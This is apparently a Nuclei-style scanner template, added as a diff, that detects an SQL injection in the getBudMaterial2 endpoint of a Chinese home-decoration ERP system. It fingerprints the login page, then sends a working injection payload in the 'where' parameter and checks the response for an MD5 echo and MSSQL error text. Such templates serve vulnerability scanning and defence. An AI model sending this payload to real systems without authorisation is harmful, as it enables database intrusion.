@@ -1,0 +1,48 @@
+id: poc-yaml-znfit-erp-ms-getbudmaterial2-sqli
+info:
+  name: 家装ERP管理系统 getBudMaterial2 SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    家装ERP管理系统 getBudMaterial2 endpoint contains an SQL injection vulnerability.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: check-homepage
+    method: GET
+    path:
+      - "{{BaseURL}}/main/login.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "上海装盟信息科技有限公司"
+
+  - id: test-sql-injection
+    method: GET
+    path:
+      - "{{BaseURL}}/WEB_SERVICE/Budget.asmx/getBudMaterial2?where=1=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))&intPageIndex=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "0x{{t2}}"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
